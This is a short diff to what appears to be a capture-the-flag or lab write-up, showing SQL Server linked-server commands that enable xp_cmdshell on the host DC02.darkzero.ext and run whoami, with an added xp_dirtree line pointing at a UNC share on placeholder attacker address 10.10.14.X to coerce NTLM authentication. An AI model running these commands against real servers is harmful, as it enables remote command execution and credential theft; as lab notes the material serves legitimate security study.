@@ -81,6 +81,8 @@ EXECUTE('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02
 EXECUTE('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
 EXECUTE('EXEC xp_cmdshell ''whoami''') AT [DC02.darkzero.ext];
 
+EXECUTE('xp_dirtree ''\\10.10.14.X\share''') AT [DC02.darkzero.ext];
+
 use_link SQL07
 ```
 
